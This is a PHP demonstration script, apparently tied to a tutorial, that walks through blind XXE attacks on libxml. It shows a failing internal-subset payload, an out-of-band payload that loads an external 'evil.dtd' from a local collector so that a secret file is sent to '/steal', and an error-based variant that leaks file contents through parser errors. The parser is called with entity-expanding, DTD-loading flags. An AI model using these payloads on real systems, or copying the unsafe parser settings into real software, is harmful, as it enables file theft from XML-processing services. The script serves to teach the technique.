<?php
/**
 * §5.2, §5.3 - why blind XXE needs an external DTD, and the OOB channel working.
 * Start oob_collector.py first, then:  php blind_xxe.php ; cat hits.log
 */
libxml_use_internal_errors(true);

function parse(string $xml): array
{
    libxml_clear_errors();
    @simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT | LIBXML_DTDLOAD);
    return array_map(static fn ($e) => trim($e->message), libxml_get_errors());
}

echo "--- 1) naive: nest parameter entities in the INTERNAL subset (§5.2) ---\n";
$naive = <<<'XML'
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % file SYSTEM "tmp/secret.txt">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:8123/internal?d=%file;'>">
  %eval;
  %exfil;
]>
<r>x</r>
XML;
foreach (array_slice(parse($naive), 0, 3) as $e) {
    echo "  ERR: $e\n";
}
echo "  ^ XML 1.0 WFC 'PEs in Internal Subset': a parameter-entity reference may not\n";
echo "    appear inside a markup declaration in the internal subset. Hence external DTDs.\n";

echo "\n--- 2) correct: push the nesting into an EXTERNAL DTD (§5.3) ---\n";
$oob = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % dtd SYSTEM "http://127.0.0.1:8123/evil.dtd">%dtd;]><r>x</r>';
foreach (array_slice(parse($oob), 0, 2) as $e) {
    echo "  (parser note) $e\n";
}
echo "  now check hits.log for  /steal?d=<base64>\n";

echo "\n--- 3) error-based: the data comes back inside the parser error (§5.4) ---\n";
$err = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % dtd SYSTEM "http://127.0.0.1:8123/error.dtd">%dtd;]><r>x</r>';
foreach (parse($err) as $e) {
    echo '  ' . str_replace("\n", '\\n', $e) . "\n";
    if (preg_match('#/nonexistent/(.+)$#s', $e, $m)) {
        echo '  >>> LEAKED: ' . str_replace("\n", '\\n', trim($m[1])) . "\n";
    }
}
echo "  No outbound request carried the data - it rode back in the error string.\n";
echo "  This only reaches an attacker if the application echoes parser errors.\n";
